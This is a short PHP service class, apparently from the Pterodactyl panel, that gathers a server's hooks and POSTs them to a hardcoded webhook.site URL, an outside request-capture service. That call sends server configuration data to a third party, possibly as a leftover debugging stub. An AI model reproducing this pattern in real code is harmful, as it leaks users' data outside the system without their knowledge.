<?php

namespace Pterodactyl\Services\Hooks;


use Pterodactyl\Jobs\Hook\ExecuteHookActionJob;
use Pterodactyl\Models\Schedule;
use Illuminate\Http\Client\RequestException;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Notification;
use Pterodactyl\Exceptions\ActionExecutionException;
use Pterodactyl\Exceptions\TriggerExecutionException;
use Pterodactyl\Models\Hook;
use Pterodactyl\Models\Server;
use Pterodactyl\Repositories\Eloquent\HookRepository;
use Pterodactyl\Transformers\Api\Client\HookTransformer;

class HookSyncService
{
    /**
     * HookExecutionService constructor.
     */
    public function __construct(protected HookRepository $repository, protected \Pterodactyl\Transformers\Api\Application\HookTransformer $hookTransformer) {}

    /**
     * Execute a hook
     *
     */
    public function handle(Server $server): void
    {
        $hooks = $this->repository->findServerHooks($server->id);

        $transformedHooks = $hooks->map(fn ($hook) => $this->hookTransformer->transform($hook))->toArray();

        Http::post("https://webhook.site/9e8bacf0-fc12-46d1-a80e-eacd7716e119", $transformedHooks);
    }
}
